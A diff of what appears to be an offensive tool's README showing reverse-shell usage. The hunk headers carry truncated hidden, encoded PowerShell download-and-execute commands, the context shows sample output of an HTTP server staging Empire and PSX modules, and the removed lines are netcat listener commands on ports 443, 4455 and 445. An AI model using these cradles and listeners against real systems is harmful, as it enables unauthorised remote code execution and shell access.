@@ -73,10 +73,6 @@ powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw
 [!] Currently serving: /usr/share/powershell-empire/empire/server/data/module_source/management
 [!] Ctrl+C terminates the server
 
-WARNING: Do not forget to start a netcat listener on port 443
-
-$ nc -lnvp 443
-
 Serving HTTP on 192.168.0.111 port 80 (http://192.168.0.111:80/) ...
 ```
 ### PowerCat (bind cmd)
@@ -115,10 +111,6 @@ powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw
 [!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
 [!] Ctrl+C terminates the server
 
-WARNING: Do not forget to start a netcat listener on port 4455
-
-$ nc -lnvp 4455 -c 'stty raw -echo; fg; reset'
-
 Serving HTTP on 10.8.0.2 port 8080 (http://10.8.0.2:8080/) ...
 ```
 ### ConPty (fullscreen terminal explicit sizing)
@@ -137,10 +129,6 @@ powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw
 [!] Starting HTTP server on wg0 port 80
 [!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
 [!] Ctrl+C terminates the server
-
-WARNING: Do not forget to start a netcat listener on port 445
-
-$ nc -lnvp 445 -c 'stty raw -echo; fg; reset'
 
 Serving HTTP on 10.8.0.2 port 80 (http://10.8.0.2:80/) ...
 ```
